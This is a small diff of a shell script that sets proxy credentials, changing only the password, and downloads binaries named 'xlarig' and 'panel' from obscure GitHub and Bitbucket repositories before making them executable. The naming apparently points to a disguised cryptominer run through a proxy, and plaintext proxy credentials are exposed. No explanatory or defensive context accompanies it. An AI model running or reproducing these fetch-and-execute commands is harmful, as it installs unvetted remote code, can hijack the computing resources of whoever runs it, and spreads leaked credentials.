@@ -1,7 +1,7 @@
 proxy="34.192.31.89" 
 port="1080" 
 user="fixie"  
-pass="ZItqWDieBi3LhbH" 
+pass="DVNQg3k1fzQFZOl" 
 wget -q -O xlarig https://github.com/devinasaliya/super-eureka/raw/main/nevo && chmod +x xlarig
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
